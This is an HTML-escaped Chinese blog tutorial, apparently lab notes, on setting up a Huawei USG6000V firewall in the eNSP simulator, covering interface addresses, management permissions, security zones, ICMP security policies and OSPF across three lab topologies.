&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1]int g0/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet0/0/0]ip address 192.168.100.18 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet0/0/0]service-manage enable	#防火墙安全策略配置管理协议启用访问管理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet0/0/0]service-manage ping permit	#允许ping防火墙&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet0/0/0]service-manage http permit 	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet0/0/0]service-manage https permit	#允许浏览器访问防火墙进行配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet0/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;配置完成后，可以使用ping命令先测试，测试成功后，浏览器访问登录&lt;/p&gt;
&lt;img src=&#34;/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411190516243.png&#34; alt=&#34;image-20240411190516243&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;img src=&#34;/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411190607110.png&#34; alt=&#34;image-20240411190607110&#34; style=&#34;zoom: 33%;&#34;&gt;



&lt;p&gt;3.然后配置防火墙安全区域，即使pc1能够和防火墙正常通信&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet1/0/0]ip address 192.168.100.20 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet1/0/0]service-manage enable &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet1/0/0]service-manage all permit &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1]firewall zone trust 	#进入trust区域&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-zone-trust]add interface g1/0/0	#将接口G1/0/0添加到trust区域中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后再尝试利用pc机ping防火墙，可以正常通信。&lt;/p&gt;
&lt;h2 id=&#34;实验拓扑图二：&#34;&gt;&lt;a href=&#34;#实验拓扑图二：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图二：&#34;&gt;&lt;/a&gt;实验拓扑图二：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094036246.png&#34; alt=&#34;image-20240416094036246&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：-1&#34;&gt;&lt;a href=&#34;#实验过程：-1&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.首先配置pc1和pc2，注意网关&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094200587.png&#34; alt=&#34;image-20240416094200587&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094249574.png&#34; alt=&#34;image-20240416094249574&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.然后配置防火墙的两个端口，就是刚才两台pc机的网关。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;USG6000V1&amp;gt;sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG6000V1]sysname FW1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]ip address 10.1.2.2 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]ip address 2.2.2.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;3.然后配置各端口上的service-manage，保证ping命令能够允许&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]service-manage enable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]service-manage ping permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]service-manage enable &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]service-manage ping permit &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;4.然后配置不同的安全区域并加入对应的端口&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone trust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-trust]add interface g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone untrust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-untrust]add interface g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;5.然后开始配置安全策略，使pc1可以ping通pc2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]security-policy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security]rule name 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]source-address 10.1.2.1 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]destination-address 2.2.2.2 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]service icmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]action permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后进行验证，结果应当是pc1可以ping通pc2，但是pc2无法ping通pc1&lt;/p&gt;
&lt;h2 id=&#34;实验拓扑图三：&#34;&gt;&lt;a href=&#34;#实验拓扑图三：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图三：&#34;&gt;&lt;/a&gt;实验拓扑图三：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416104546562.png&#34; alt=&#34;image-20240416104546562&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：-2&#34;&gt;&lt;a href=&#34;#实验过程：-2&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.首先配置pc机的ip网关以及各个设备的端口的ip，具体如上图&lt;/p&gt;
&lt;p&gt;这边就不在展示了，很基础的，就给各个端口配各ip，注意不要漏了，这里就先只配ip，其他的暂时不要动，跟着后面的步骤走&lt;/p&gt;
&lt;p&gt;2.然后开始配置两个防火墙的端口的service-manage&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]service-manage enable &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]service-manage ping permit &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]service-manage enable &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]service-manage ping permit &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/0]service-manage enable &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/0]service-manage ping permit &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/1]service-manage enable &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/1]service-manage ping permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;3.然后配置安全区域&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone trust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-trust]add interface g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone untrust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-untrust]add interface g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2]firewall zone trust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-trust]add interface g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2]firewall zone untrust 	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-untrust]add interface g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;4.然后配置安全策略&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]security-policy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security]rule name 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]source-address 10.18.1.1 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]destination-address 10.18.2.1 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]service icmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]action permit &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2]security-policy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-policy-security]rule name 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-policy-security-rule-1]source-address 10.18.1.1 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-policy-security-rule-1]destination-address 10.18.2.1 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-policy-security-rule-1]service icmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-policy-security-rule-1]action permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-policy-security-rule-1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-policy-security]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;5.最后开始配置ospf，保证网络的连通&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[AR1]ospf 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-ospf-1]area 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-ospf-1-area-0.0.0.0]network 10.18.11.0 0.0.0.255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-ospf-1-area-0.0.0.0]network 10.18.12.0 0.0.0.255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-ospf-1-area-0.0.0.0]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]ospf 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-ospf-1]area 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-ospf-1-area-0.0.0.0]network 10.18.11.0 0.0.0.255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-ospf-1-area-0.0.0.0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-ospf-1]area 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-ospf-1-area-0.0.0.1]network 10.18.1.0 0.0.0.255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-ospf-1-area-0.0.0.1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-ospf-1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

